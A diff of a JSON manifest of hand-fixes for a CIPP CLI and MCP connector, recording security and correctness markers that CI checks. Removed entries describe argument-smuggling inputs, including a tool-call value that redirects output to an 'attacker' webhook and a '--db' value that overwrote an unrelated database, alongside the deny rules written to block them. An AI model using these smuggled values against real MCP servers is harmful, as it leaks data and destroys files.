@@ -4,38 +4,27 @@
  "_comment": "Connector-specific edits to GENERATED/authored files that a cli-printing-press reprint must NOT clobber. check_handfixes.py asserts every marker below is still present (and banned anti-patterns absent) and fails CI if a reprint dropped one. Provenance: live-verification report from Abhi Saini (Bearium Networks) in the Compounding Teams Community Discussion, 2026-08-13 (badge flip PR #199).",
  "handfixes": [
   {
-   "id": "sync-empty-hint-points-at-fanout",
-   "summary": "The empty-sync hint tells the user to run `fanout --endpoint <x> --all-tenants --save`, not the press's generic `--resources` suggestion",
-   "why": "CIPP's API is tenant-scoped end to end and exposes no bulk-list endpoints, so `syncResourcePath()`'s path map is generated EMPTY and `knownSyncResourceNames()` returns nothing. The press's generic empty-sync hint tells the user to 'use --resources for explicit sync targets' - a dead end here, because every --resources value errors 'unknown sync resource'. The hint pointed at the one remedy that cannot work while the real mechanism (per-endpoint fan-out across tenants) went unmentioned. Abhi Saini hit exactly this and had to derive fanout from scratch with an agent. A reprint re-emits the generic wording.",
-   "status": "active",
-   "spec_encode_followup": "Press-side: a connector whose generated sync path-map is empty should emit a connector-aware remedy (or, per upstream cli-printing-press #3659 'gate zero-sync data surfaces', not advertise the sync surface at all) instead of pointing at --resources. Re-check on the next reprint - cipp is on the 4.24.0 engine and #3659 landed after it.",
-   "asserts": [
-    {
-     "file": "cli/internal/cli/sync.go",
-     "contains": "--all-tenants --save",
-     "min_count": 2
-    },
-    {
-     "file": "cli/internal/cli/sync.go",
-     "not_contains": "use --resources for explicit sync targets"
-    }
-   ]
-  },
-  {
    "id": "tenant-list-envelope-unwrap",
    "summary": "parseTenantArray unwraps a {\"Results\": [...]} envelope before falling back to the lone-tenant path, so --all-tenants fan-out enumerates the fleet",
    "why": "Current CIPP returns /ListTenants as {\"Results\":[...]}; the novel cross-tenant code only handled a bare array and fell back to 'treat the whole payload as one tenant object'. That object resolves no defaultDomainName, gets dropped, and every --all-tenants fan-out reports ZERO tenants against a healthy CIPP with a 6.6 KB response on the wire. The rest of the tree already knew the key - promoted_list-tenants.go writes the store from \"Results\" and sync.go's pageItemKeys lists results/Results - only the novel path missed it. cipp_tenants.go is a NOVEL (non-generated) file, so this survives a reprint as a carried novel; the assert guards against a novel-rewrite dropping it.",
    "status": "active",
    "asserts": [
     {
-     "file": "cli/internal/cli/cipp_tenants.go",
-     "contains": "tenantEnvelopeArray",
-     "min_count": 2
-    },
-    {
      "file": "cli/internal/cli/cipp_tenants_test.go",
      "contains": "Results envelope",
      "min_count": 1
+    },
+    {
+     "file": "cli/internal/cli/cipp_tenants.go",
+     "contains": "raw, err := cippListRows(data, \"tenant list\", tenantRecordFields, \"defaultDomainName\")",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/cipp_tenants.go",
+     "contains": "func cippListRows(data json.RawMessage, what string, rowExcept map[string]bool, idKeys ...string) ([]map[string]any, error) {",
+     "min_count": 1,
+     "code_only": true
     }
    ]
   },
@@ -111,12 +100,13 @@
     },
     {
      "file": "cli/internal/cli/auth.go",
-     "contains": "cfg.SaveTokens(\"\", \"\", args[0], \"\", time.Time{})",
-     "min_count": 1
+     "contains": "cfg.SaveTokens(\"\", \"\", token, \"\", time.Time{})",
+     "min_count": 1,
+     "code_only": true
     },
     {
      "file": "cli/internal/cli/auth.go",
-     "not_contains": "cfg.SaveTokens(\"\", \"\", args[0], \"\", cfg.TokenExpiry)"
+     "not_contains": "cfg.SaveTokens(\"\", \"\", token, \"\", cfg.TokenExpiry)"
     },
     {
      "file": "cli/internal/client/token_refresh_test.go",
@@ -236,8 +226,9 @@
     },
     {
      "file": "cli/internal/client/client.go",
-     "contains": "cliutil.SanitizeErrorBody(c.maskCredentialTextLocked(string(body), clientSecret))",
-     "min_count": 1
+     "contains": "c.maskCredentialTextLocked(TokenErrorText(body), clientSecret))",
+     "min_count": 1,
+     "code_only": true
     },
     {
      "file": "cli/internal/client/client.go",
@@ -306,7 +297,7 @@
      "contains": "func doctorProbeCredentials("
     },
     {
-     "file": "cli/internal/cli/doctor_verdict.go",
+     "file": "cli/internal/cli/doctor.go",
      "contains": "func doctorBaseURLIsPlaceholder("
     },
     {
@@ -328,6 +319,36 @@
     {
      "file": "cli/internal/cli/doctor.go",
      "not_contains": "for _, v := range report {"
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "doctorProbeCredentials(cmd.Context(), c, cmd.Root(),",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "report[\"credentials\"] = \"ERROR not verified: no credential is configured, so nothing was probed.\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "report[\"api\"] = \"not configured (base_url is a placeholder); set \" + doctorBaseURLEnv + \" to your own instance URL\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "doctorBaseURLIsShippedPlaceholder(cfg.BaseURL)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor_verdict.go",
+     "contains": "func doctorBaseURLIsShippedPlaceholder(base string) bool {",
+     "min_count": 1,
+     "code_only": true
     }
    ]
   },
@@ -367,55 +388,6 @@
      "file": "mcp-install.md",
      "contains": "\"CIPP_BASE_URL\":",
      "min_count": 3
-    }
-   ]
-  },
-  {
-   "id": "mcp-filesystem-destination-gate",
-   "summary": "The MCP shell-out layer refuses filesystem-destination flags (--db, --input, --output, --out, --home, --audit-dir, --receipt-file and friends) and any argument name carrying '=', so a tool call cannot point the local SQLite store, or any other file this account can reach, at a path of its choosing",
-   "why": "The MCP server runs the companion CLI as the server account and forwarded every command-local flag straight through as a CLI argument. `sync` and the other local-store commands expose --db, and the store's migration runs `DROP TABLE IF EXISTS resources_fts` plus a resources-table rebuild against whatever file it is handed, so one tool call shaped {\"db\": \"/path/to/someone-elses.sqlite\"} rewrote an unrelated database - no credentials required, because sync opens the store before it ever reaches the API. Proven end to end: against the pre-fix binary a single MCP tools/call on `sync` changed the victim file's sha and left resources_fts with 0 rows; against the patched binary the same call returns the same sync summary and the victim file is byte-identical. The gate has three parts, all in cli/internal/mcp/cobratree/shellout.go: blockedDestinationFlags (the runtime name floor, unioned into cliArgsFromMCP alongside the pre-existing blockedRootFlags behaviour, which is unchanged); an argument-name '=' guard, because \"db=/tmp/evil\" was emitted as --db=/tmp/evil and a name-only denylist never saw it; and isFilesystemPathFlag, which classifies a flag by its USAGE TEXT rather than its NAME. The usage-text test is load bearing and must not be turned into a name rule: the generated command surface carries API body fields called --path, --seed-path, --source-paths, --exclude-paths, --filename and --working-dir whose values go to the vendor API and never touch this account's disk, so a name rule would break real API surfaces while still missing the next generated flag that does take a local path. UnblockedFilesystemPathFlags applies that rule to the live Cobra tree over exactly the command set RegisterAll turns into shell-out tools (endpoint and framework commands are out of scope, which is what keeps the rule off generated vendor body fields), and TestNoShellOutToolCanDirectAFilesystemPath fails the build when a regeneration grows a local-path flag the floor does not name. vendorAPIPathFlags is the documented exception list for flags whose usage trips the rule but which name a location in the vendor's world. Both directions are pinned by the tests: the --db argument must be dropped AND an ordinary flag must still be forwarded, because a gate that swallows the real MCP surface is as harmful as one that misses the defect.",
-   "status": "active",
-   "spec_encode_followup": "Press-side: the gate belongs in the generator. Two known residuals a reprint should close rather than re-inherit. (1) On the pre-4.30 cobratree the blocked flags are dropped at forward time but still appear in the tool's input schema, because toolOptionsForFlags in typemap.go advertises every flag; the caller gets silence instead of an error. The 4.30 shape (blockedStructuredArgsForCommand + allowedStructuredArgsForCommand) removes them from the schema and errors on them, which is the better behaviour. (2) isFilesystemPathFlag is only consulted by the package test here, not at request time, because the pre-4.30 shellOutToCLI receives no *cobra.Command; wiring it into the per-command blocked set (as skills/servosity does) makes a newly generated path flag refused at runtime rather than at CI time.",
-   "asserts": [
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "var blockedDestinationFlags = map[string]bool{",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "blockedDestinationFlags[k]",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "strings.Contains(k, \"=\")",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "func isFilesystemPathFlag(flag *pflag.Flag) bool {",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "func UnblockedFilesystemPathFlags(root *cobra.Command) []string {",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/filesystem_gate_test.go",
-     "contains": "func TestMCPCannotDirectTheLocalStore(",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/filesystem_gate_test.go",
-     "contains": "func TestMCPCannotSmuggleAFlagThroughAnEqualsSign(",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/filesystem_tree_test.go",
-     "contains": "func TestNoShellOutToolCanDirectAFilesystemPath(",
-     "min_count": 1
     }
    ]
   },
@@ -477,11 +449,6 @@
      "min_count": 1
     },
     {
-     "file": "cli/internal/mcp/mcp_config_resolution_test.go",
-     "contains": "func TestMCPClientHonoursTheConfigEnvVar(",
-     "min_count": 1
-    },
-    {
      "file": "cli/internal/cli/auth.go",
      "contains": "if config.NoConfigWrite() {",
      "min_count": 1
@@ -500,52 +467,22 @@
      "file": "guide.md",
      "contains": "| `auth login` / `auth set-token` | Refuse, naming the variable, instead of reporting a save that did not happen. |",
      "min_count": 1
-    }
-   ]
-  },
-  {
-   "id": "mcp-argv-value-joined",
-   "summary": "cliArgsFromMCP emitted every tool-call value as its OWN argv element after its flag (--json <value>). Every value-carrying branch (string, float64, []any, default) now joins the value to the flag as one element (--json=<value>); bool true stays a bare --flag and the empty-string skip is unchanged.",
-   "why": "blockedRootFlags and blockedDestinationFlags filter KEYS only. A Cobra bool flag has NoOptDefVal and does not consume the token after it, so a tool-call VALUE that begins with '--' was parsed by pflag as its own flag: {\"json\": \"--deliver=webhook:https://attacker/\"} became argv `--json --deliver=webhook:...` and the denylisted --deliver took effect. Proven end to end on the real hudu-mcp binary (this same generated shellout.go) during the PR #317 review: a local webhook received 4,797 bytes of `doctor --json` output. Reported privately per SECURITY.md on 2026-09-09 as affecting the whole fleet (six connectors spot-checked by the reporter); this is the fleet backport of datagate commit 4075043e. Joined, pflag rejects the value outright on a bool flag (strconv.ParseBool) and contains it as the literal value on a string flag, so no value can ever reach a second flag. Fixed upstream in cli-printing-press main at be378adf (#4647, closes #4643, 2026-09-09) with the identical four lines, but NOT yet in a tagged press release (latest 4.32.1), so a reprint from any press at or below 4.32.1 REINTRODUCES the defect while go build and go test stay green; this entry is what notices. Retire it only after a reprint from a press release that carries #4647. code_only because the explanatory comment above the loop describes the joined form - the assert must be satisfied by the emission lines themselves. shellout_test.go (TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag) proves both directions: the split argv sets --deliver, the joined argv cannot.",
-   "status": "active",
-   "asserts": [
+    },
     {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+tv)",
+     "file": "cli/internal/config/config.go",
+     "contains": "return c.saveCredentialMaterial()",
      "min_count": 1,
      "code_only": true
     },
     {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+strconv.FormatFloat(tv, 'f', -1, 64))",
+     "file": "cli/internal/config/config.go",
+     "contains": "func NoConfigWrite() bool {",
      "min_count": 1,
      "code_only": true
     },
     {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+strings.Join(parts, \",\"))",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+fmt.Sprintf(\"%v\", v))",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "not_contains": "\"--\"+k, "
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout_test.go",
-     "contains": "func TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag(",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout_test.go",
-     "contains": "\"--filter=map[a:1]\"",
+     "file": "cli/internal/cli/auth.go",
+     "contains": "if config.NoConfigWrite() {",
      "min_count": 1,
      "code_only": true
     }
@@ -586,135 +523,6 @@
     {
      "file": "cli/internal/mcp/request_contracts.json",
      "contains": "\"properties\""
-    }
-   ]
-  },
-  {
-   "id": "interim-http-security-note-2026-10-22",
-   "summary": "mcp-install.md and README.md open with the interim HTTP-mode security note and pauses the remote-agent recipe (launch line commented out, no tunnel step) until this connector is reprinted; CIPP's GET endpoints named as actions are listed and flagged; the README and page.json ChatGPT answers say HTTP mode is paused.",
-   "why": "Docs-only interim fix ratified 2026-10-22. This build's HTTP mode is unsafe (no password and/or no rebinding guard, no request limits, writes with no confirmation), so the install guide must not tell anyone to run it or tunnel it. mcp-install.md is regenerated by msp-skills-publish onboard.py; this entry makes a regeneration that drops the note fail CI. Remove it on purpose with the post-reprint docs fix. 2026-10-22 follow-up to #428: README.md (security note under \"Works with your agent\", the ChatGPT / Copilot Studio / Gemini rows, the ChatGPT paragraph and FAQ) and page.json (ChatGPT FAQ, and from there docs/skills and llms-full.txt) carry the same pause. README.md is regenerated by onboard.py render_readme; page.json's FAQ is agent-authored prose, so a re-polish that restores the HTTPS/tunnel answer fails here.",
-   "status": "active",
-   "asserts": [
-    {
-     "file": "mcp-install.md",
-     "contains": "**Security note (until this connector is reprinted).**",
-     "min_count": 1
-    },
-    {
-     "file": "mcp-install.md",
-     "contains": "# Remote agents (paused until this connector is reprinted)",
-     "min_count": 1
-    },
-    {
-     "file": "mcp-install.md",
-     "not_contains": "via a secure tunnel"
-    },
-    {
-     "file": "mcp-install.md",
-     "contains": "For CIPP: the `cipp_execute` tool can call any of CIPP's 299 write",
-     "min_count": 1
-    },
-    {
-     "file": "mcp-install.md",
-     "contains": "## Appendix: CIPP GET endpoints named as actions",
-     "min_count": 1
-    },
-    {
-     "file": "mcp-install.md",
-     "contains": "| GET | `/RemoveStandard` | `remove-standard.list` |",
-     "min_count": 1
-    },
-    {
-     "file": "SKILL.md",
-     "contains": "## Read this first: some CIPP GET calls change things",
-     "min_count": 1
-    },
-    {
-     "file": "README.md",
-     "contains": "**Security note (until this connector is reprinted).**",
-     "min_count": 1
-    },
-    {
-     "file": "README.md",
-     "contains": "### Does this work with ChatGPT?\n\nNot with this build.",
-     "min_count": 1
-    },
-    {
-     "file": "README.md",
-     "not_contains": "--addr :7777"
-    },
-    {
-     "file": "page.json",
-     "contains": "\"a\": \"Not with this build.",
-     "min_count": 1
-    },
-    {
-     "file": "page.json",
-     "not_contains": "--addr :7777"
-    }
-   ]
-  },
-  {
-   "id": "mcp-file-flags-refused",
-   "class": "mcp-file-flag",
-   "summary": "An MCP tool call can no longer name a file or directory on the MCP host: the cobratree mirror (press 4.24 and earlier) computes one blocked set per command (destination flags and mcp:write-flags always, root control-plane flags unless the command redefines them locally), leaves those flags out of the tool schema, and refuses both them and any argument the command does not declare with an error naming it; before, the schema advertised them, the shell-out layer forwarded any key it was handed, and blocked ones were dropped silently, so a call ran without the input it asked for and an undeclared key reached a subcommand through the args field (superops raw --vars @path)",
-   "why": "The MCP server runs the companion CLI as the account that hosts it; the operator at the command line is trusted, an MCP caller is not. tools/maintainer/check_mcp_file_flags.py derives, from data flow in this connector's code, every flag whose value can start a filesystem path (open, read, write, stat, mkdir, walk, exec, @path expansion), then drives the real MCP server and asserts each such flag is absent from every mirrored tool's schema and refused by name when supplied, and that an ordinary flag still reaches the CLI. On origin/main this connector failed it. Edits: the cobratree mirror (press 4.24 and earlier) computes one blocked set per command (destination flags and mcp:write-flags always, root control-plane flags unless the command redefines them locally), leaves those flags out of the tool schema, and refuses both them and any argument the command does not declare with an error naming it; before, the schema advertised them, the shell-out layer forwarded any key it was handed, and blocked ones were dropped silently, so a call ran without the input it asked for and an undeclared key reached a subcommand through the args field (superops raw --vars @path). The CLI keeps every flag. A reprint that drops these edits fails that check in CI and these asserts here.",
-   "status": "active",
-   "spec_encode_followup": "Press-side: derive the MCP-refused flag set from data flow (a flag whose value can start a filesystem path) instead of usage text or a name list, drop refused flags from every tool schema, refuse them by name at call time, and refuse binary multipart fields in the in-process endpoint handler. Drafted as an upstream issue for cli-printing-press (import --input exposure); tools/maintainer/check_mcp_file_flags.py is the fleet gate until a reprint carries it.",
-   "asserts": [
-    {
-     "file": "cli/internal/mcp/cobratree/walker.go",
-     "contains": "blocked := blockedFlagsForCommand(cmd)",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/walker.go",
-     "contains": "shellOutToCLI(cliPath, path, blocked, declaredMCPFlagNames(cmd), inlineOnlyFlagsForCommand(cmd), commandTakesArgs(cmd))",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/typemap.go",
-     "contains": "func toolOptionsForFlags(cmd *cobra.Command, blocked map[string]bool) []mcplib.ToolOption {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/typemap.go",
-     "contains": "if blocked[flag.Name] {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "if msg := refuseMCPArgs(args, declared, blocked, inlineOnly, takesArgs); msg != \"\" {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/mcp_file_flags.go",
-     "contains": "func refuseMCPArgs(args map[string]any, declared, blocked, inlineOnly map[string]bool, takesArgs bool) string {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/mcp_file_flags.go",
-     "contains": "func blockedFlagsForCommand(cmd *cobra.Command) map[string]bool {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/mcp_file_flags.go",
-     "contains": "if name != mcpPositionalArgsField && !local[name] {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/mcp_file_flags.go",
-     "contains": "func flagWriteSinkNames(cmd *cobra.Command) map[string]bool {",
-     "min_count": 1,
-     "code_only": true
     }
    ]
   },
@@ -766,19 +574,7 @@
     },
     {
      "file": "cli/internal/client/client.go",
-     "contains": "return cliutil.FunnelWithhold(masked, held)",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/client/client.go",
      "contains": "func (c *Client) shownErrorBody(body []byte, extraCredentials ...string) string {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "contains": "Body:       c.shownErrorBody(respBody, authHeader),",
      "min_count": 1,
      "code_only": true
     },
@@ -796,7 +592,7 @@
     },
     {
      "file": "cli/internal/cli/auth_login.go",
-     "contains": "cliutil.SanitizeErrorBody(cliutil.FunnelWithhold(maskSecret(strings.TrimSpace(string(body)), clientSecret), []string{clientSecret}))",
+     "contains": "cliutil.FunnelWithhold(maskSecret(client.TokenErrorText(body), clientSecret), []string{clientSecret}))",
      "min_count": 1,
      "code_only": true
     },
@@ -893,8 +689,1246 @@
      "contains": "func TestAuthLogin_AADErrorBranchWithholdsEncodedSecret(t *testing.T) {",
      "min_count": 1,
      "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "return cliutil.FunnelWithhold(finishCredentialMask(masked, secrets), held)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "bodyText := c.shownErrorBody(respBody, authHeader)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "not_contains": "bodyText := truncateBody(respBody)"
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "c.shownSummary(respBody, summary, authHeader)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "func (c *Client) shownSummary(body []byte, summary string, extraCredentials ...string) string {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "c.holdCredentials()",
+     "min_count": 2,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/auth_login.go",
+     "contains": "cliutil.FunnelWithhold(maskSecret(err.Error(), clientSecret), []string{clientSecret})",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/round1_review_test.go",
+     "contains": "func TestAuthLoginTransportErrorWithholdsEncodedSecret(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ],
+   "hand_wired": {
+    "token-exchange:internal/cli/auth_login.go:cippClientCredentialsToken": "cippClientCredentialsToken funnels the complete non-2xx token body (after RedactTokenResponse and maskSecret) through cliutil.FunnelWithhold before anything is formatted, then shows only client.TokenErrorText (an allowlisted Azure AD code and description) through the funnel again; connection errors pass the funnel too. Pinned by the auth_login.go asserts on this entry, TestAuthLogin_AADErrorBranchWithholdsEncodedSecret and TestAuthLoginTransportErrorWithholdsEncodedSecret."
+   }
+  },
+  {
+   "id": "skill-md-get-action-warning",
+   "status": "active",
+   "summary": "SKILL.md tells the agent that 39 CIPP GET endpoints named as actions change state and must be confirmed with the user, and names each command.",
+   "why": "Moved out of interim-http-security-note-2026-10-22 when that entry retired at press 4.34.0. The GET endpoints still mutate (RemoveStandard, ExecSendOrgMessage, ExecRunBackup); 4.34.0 gates them in the MCP server, but their CLI commands still run as soon as they are invoked, so the skill text an agent reads first has to say so.",
+   "asserts": [
+    {
+     "file": "SKILL.md",
+     "contains": "## Read this first: some CIPP GET calls change things",
+     "min_count": 1
     }
    ]
+  },
+  {
+   "id": "mcp-context-fits-budget",
+   "status": "active",
+   "summary": "The MCP context tool compacts its endpoint catalog when the payload would exceed bound.MaxBytes.",
+   "why": "About 560 endpoints make the resources catalog larger than bound.MaxBytes, and bound.JSON then falls back to a preview envelope that drops tool_count, auth and every other top-level field; the generated TestMCPContextMatchesRegisteredToolSurface fails on a raw 4.34.0 render. A reprint re-emits the uncompacted catalog.",
+   "spec_encode_followup": "Press-side: the context tool should size its catalog to bound.MaxBytes for large surfaces.",
+   "asserts": [
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "ctx[\"resources\"] = compactContextResources(ctx[\"resources\"])",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "func compactContextResources(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "cipp-results-failure-detection",
+   "status": "active",
+   "summary": "detectPartialFailure delegates to the CIPP Results-envelope parser first, so a write CIPP answers with HTTP 200 and a failure string is detected (bulk and the non-promoted write commands exit non-zero; the promoted typed commands still exit 0, see the docs).",
+   "why": "CIPP hardcodes HTTP 200 on several write entrypoints and reports failures as prose inside a Results array. The generated detector only matches Google Ads' partialFailureError object, so a failed write exited 0. cipp_results.go is hand-written; the delegation in generated helpers.go is what a reprint drops.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/helpers.go",
+     "contains": "if report := detectCippResultsFailure(data); report != nil {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/cipp_results.go",
+     "contains": "func detectCippResultsFailure(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "auth-login-client-credentials",
+   "status": "active",
+   "summary": "auth login performs the CIPP API client's OAuth2 client-credentials exchange (hand-written auth_login.go, wired into the generated auth command).",
+   "why": "The spec declares only bearer auth, so the press emits no login command; without this wiring an operator has no way to mint a token from the CIPP API client CIPP issues.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/auth.go",
+     "contains": "cmd.AddCommand(newAuthLoginCmd(flags))",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/auth_login.go",
+     "contains": "func newAuthLoginCmd(flags *rootFlags) *cobra.Command {",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "token-response-redaction",
+   "status": "active",
+   "summary": "A non-2xx token-endpoint body is redacted structurally (token members removed, escaped JSON included) before it is shown, and a negative expires_in is refused.",
+   "why": "An authority answering 4xx with a token in the body would print that token in the error. Codex rounds 1 to 3 on the reprint found a \\u-escaped token value slipping past a regex-only redaction; JSON bodies are now parsed, redacted and re-serialized. A negative expires_in would stamp an expiry in the past and re-mint on every request. Codex round 1 on the publish branch: a token member whose NAME is escaped (access\\u005ftoken inside a prefixed error_description) slipped past both; the text is now decoded layer by layer and withheld whole if a token member survives.",
+   "asserts": [
+    {
+     "file": "cli/internal/client/token_redact.go",
+     "contains": "func RedactTokenResponse(body string) string {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "body = []byte(RedactTokenResponse(string(body)))",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/auth_login.go",
+     "contains": "body = []byte(client.RedactTokenResponse(string(body)))",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "return fmt.Errorf(\"OAuth client_credentials mint: %w\", ErrExpiredOnArrival)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/token_hardening_test.go",
+     "contains": "func TestRedactTokenResponseCatchesUnicodeEscapes(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/token_redact.go",
+     "contains": "if tokenFieldSurvives(body) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/token_redact_escape_test.go",
+     "contains": "func TestRedactTokenResponseWithholdsEscapedMemberNames(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "fanout-save-integrity",
+   "status": "active",
+   "summary": "fanout --save replaces a tenant's stored rows in one transaction, and only from a well-formed list: a JSON array, or an envelope whose Results is an array, whose every element is an object carrying the endpoint's identity key (an id-class field: id, _id, id_, uuid, guid, Identity, RowKey; or, from the CIPP-API source, UPN/PrimarySmtpAddress for /ListMailboxForwarding, displayName for /ListStandards, GroupId for /ListGDAPRoles, skuId for /ListLicenses). JSON null, an empty body, a duplicate key, a lone object, a string or any other shape is shown and not stored, the tenant is reported as an error and not checkpointed, and the stored rows stay. A response with any failure signal is refused before that (tenant-list-message-is-not-a-fleet).",
+   "why": "Saving by upsert kept rows CIPP no longer returns, an envelope was stored as one row, and a Results array mixing rows with a failure string was saved as the complete set, deleting rows it omitted (Codex round 3 on the reprint; TestFanoutPartialResultWithMessageKeepsRows). Batch 1b Codex round 1: a lone {\"id\":\"error-1\",\"error\":\"HTTP 403\"} was saved as the whole user list and deleted u1 and u2. Batch 1b Codex round 2: a bare JSON null decoded as an empty list and deleted u1 and u2.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/fanout.go",
+     "contains": "if _, err := db.ReplaceTenantRows(resourceType, t.DefaultDomainName, stamped); err != nil {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fanout.go",
+     "contains": "func rowsCarryMessages(arr []json.RawMessage) error {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/reprint_review_test.go",
+     "contains": "func TestFanoutPartialResultWithMessageKeepsRows(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/reprint_review_test.go",
+     "contains": "func TestFanoutFailureMessageKeepsStoredRows(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/tenant_scope.go",
+     "contains": "return 0, fmt.Errorf(\"refusing to replace %s rows for %s: the response holds a non-row item %s\", resourceType, tenant, truncateItem(item))",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/tenant_scope_refuse_test.go",
+     "contains": "func TestReplaceTenantRowsRefusesNonRowItems(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/round1_review_test.go",
+     "contains": "func TestFanoutRefusesAllMessageArray(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fanout.go",
+     "contains": "func fanoutSaveRows(endpoint string, data json.RawMessage) ([]json.RawMessage, error) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fanout.go",
+     "contains": "rows, shapeErr := fanoutSaveRows(endpoint, data)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fanout.go",
+     "contains": "\"/ListMailboxForwarding\": {\"UPN\", \"PrimarySmtpAddress\"},",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fresh_1b_review_test.go",
+     "contains": "func TestFanoutLoneObjectIsNotSaved(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fresh_1b_review_test.go",
+     "contains": "func TestFanoutLoneFailureObjectKeepsStoredUsers(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fanout.go",
+     "contains": "\tif !ok {\n\t\treturn nil, notList\n\t}\n\tvar rows []any\n\tswitch x := doc.(type) {\n\tcase []any:\n\t\trows = x",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
